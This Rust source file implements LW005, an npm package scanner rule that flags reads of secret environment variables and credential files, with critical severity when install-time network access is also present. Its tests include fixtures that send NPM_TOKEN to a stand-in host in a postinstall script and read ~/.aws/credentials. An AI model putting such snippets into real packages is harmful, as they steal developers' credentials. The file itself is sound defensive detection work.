//! LW005: the package reads credentials or secrets.
//!
//! Reads of secret-looking environment variables (NPM_TOKEN, AWS_*,
//! GITHUB_TOKEN, GH_TOKEN, *SECRET*, *KEY*), dumping the whole environment,
//! or reading credential files (.npmrc, .ssh/, .aws/credentials,
//! .git-credentials). Checked in every JavaScript file. Severity is
//! `critical` when the same file also triggers LW004 (install-time network
//! access): reading a token and sending it out is a credential stealer.

use super::lw004_network::uses_network;
use super::{Finding, Rule, Severity};
use crate::analysis::JsFacts;
use crate::context::PackageContext;

pub struct CredentialAccess;

impl CredentialAccess {
    fn findings_for(
        &self,
        ctx: &PackageContext,
        file: &str,
        has_lines: bool,
        facts: &JsFacts,
        exfil: bool,
    ) -> Vec<Finding> {
        let mut out = Vec::new();
        let suffix = if exfil {
            " The same install-time file uses the network, which is how stolen secrets are sent out."
        } else {
            ""
        };
        for hit in &facts.secret_env_reads {
            out.push(self.finding(
                ctx,
                Some(file),
                has_lines.then_some(hit.line),
                &hit.evidence,
                format!(
                    "Reads the secret-looking environment variable {}.{suffix}",
                    hit.detail
                ),
            ));
        }
        if facts.reads_files {
            for hit in &facts.credential_paths {
                out.push(self.finding(
                    ctx,
                    Some(file),
                    has_lines.then_some(hit.line),
                    &hit.evidence,
                    format!("Reads a credential file ({}).{suffix}", hit.detail),
                ));
            }
        }
        if exfil {
            for f in &mut out {
                f.severity = Severity::Critical;
            }
        }
        out
    }
}

impl Rule for CredentialAccess {
    fn id(&self) -> &'static str {
        "LW005"
    }
    fn name(&self) -> &'static str {
        "Credential or secret access"
    }
    fn severity(&self) -> Severity {
        Severity::High
    }
    fn description(&self) -> &'static str {
        "reads process.env keys like NPM_TOKEN, AWS_*, GITHUB_TOKEN, GH_TOKEN, *SECRET*, *KEY*, \
         or credential files (.npmrc, .ssh/, .aws/credentials, .git-credentials); critical when \
         the same file has install-time network access (LW004)"
    }

    fn check(&self, ctx: &PackageContext) -> Vec<Finding> {
        let install = ctx.install_sources();
        let mut findings = Vec::new();
        for (path, facts) in &ctx.js {
            let exfil = install
                .iter()
                .any(|s| s.has_lines && s.file == path && uses_network(s));
            findings.extend(self.findings_for(ctx, path, true, facts, exfil));
        }
        // Inline `node -e` code.
        for source in install.iter().filter(|s| !s.has_lines) {
            findings.extend(self.findings_for(
                ctx,
                source.file,
                false,
                source.facts,
                uses_network(source),
            ));
        }
        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::test_helpers::{ctx, severities};

    #[test]
    fn token_read_with_network_at_install_is_critical() {
        let c = ctx(
            "p",
            &[
                ("package.json", r#"{"scripts": {"postinstall": "node i.js"}}"#),
                (
                    "i.js",
                    "const https = require('https');\nhttps.request({ host: 'example.invalid' })\n  .end(process.env.NPM_TOKEN);",
                ),
            ],
        );
        let f = CredentialAccess.check(&c);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!(f[0].line, Some(3));
    }

    #[test]
    fn credential_file_read_without_network_is_high() {
        let c = ctx(
            "p",
            &[
                ("package.json", r#"{"main": "index.js"}"#),
                (
                    "index.js",
                    "const fs = require('fs'), os = require('os'), path = require('path');\n\
                     const data = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\n\
                     const key = process.env.AWS_SECRET_ACCESS_KEY;",
                ),
            ],
        );
        assert_eq!(
            severities(&CredentialAccess, &c),
            [Severity::High, Severity::High]
        );
    }

    #[test]
    fn ordinary_env_vars_and_mentions_are_fine() {
        let c = ctx(
            "p",
            &[
                ("package.json", "{}"),
                (
                    "index.js",
                    "if (process.env.NODE_ENV === 'production') {}\n\
                     console.log('Add your token to .npmrc');",
                ),
            ],
        );
        assert!(CredentialAccess.check(&c).is_empty());
    }
}
